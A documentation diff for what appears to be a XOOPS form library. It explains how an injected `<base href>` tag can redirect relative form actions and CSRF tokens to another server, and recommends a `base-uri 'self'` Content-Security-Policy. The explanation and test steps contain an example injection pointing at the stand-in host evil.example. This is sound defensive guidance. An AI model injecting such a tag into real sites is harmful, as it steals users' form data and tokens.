@@ -598,6 +598,22 @@ The `form_open` function automatically injects a hidden CSRF token field for POS
 
 `form_input` passes extra parameters through as attributes, but drops names that are not plain attribute names, any `on*` event handler, and a `formaction` pointing off-site.
 
+#### Relative actions and `<base href>`
+
+Relative actions (`action="index.php"`, `formaction="index.php?op=delete"`) are emitted as written, so they keep resolving against the module page and keep their CSRF token. The browser resolves a non-empty relative action against the document base URL **when the form is submitted**; an empty action uses the document URL. An attacker who can already inject HTML can add `<base href="https://evil.example/">`, even after the form, and send the form, token included, to their own server, provided it is the first `<base href>` in the document. Root-relative actions (`/modules/x/save.php`) are affected the same way, and so are core `XoopsForm` forms and hand-written ones.
+
+This needs an existing HTML-injection bug, so fix that bug first. This library keeps relative actions as they are: it cannot reliably infer the effective document base from inside a template (proxies, AJAX fragments and blocks shown on many pages all change it), and rewriting only its own forms would leave every other form and relative `<script src>` exposed. The broader defence is a page-level policy. Send this header from the site (web server config, a theme/preload `header()` call, or Protector):
+
+```
+Content-Security-Policy: base-uri 'self'
+```
+
+`base-uri 'self'` makes the browser ignore a `<base>` that points to another origin. It permits the same-origin module base XOOPS itself emits (`header.php` adds one for start-page handling); audit custom themes and deployments for external bases before enabling it. A same-origin `<base>` can still change which local path a relative action reaches.
+
+`form-action 'self'` additionally blocks direct off-origin submissions. Audit legitimate external destinations (payment gateways, external search) and redirect chains before enabling it, and list those domains after `'self'`. Browsers enforce it differently across redirects, so it is not a portable guarantee against a same-origin endpoint forwarding the token.
+
+To verify, on a test page with no earlier `<base href>`, submit forms with `action="index.php"`, `"../news/save.php"`, `"?op=save"` and a root-relative action, plus a submit button with a relative `formaction`. Inject `<base href="https://evil.example/">` once before and once after the form, with and without the header. In the browser's Network panel, check each request URL and that the token goes only to the site. With the header, the console reports the `base-uri` violation and every form reaches its normal destination. Separately check that the start-page module still works with the header enabled.
+
 ### File upload form
 
 ```smarty
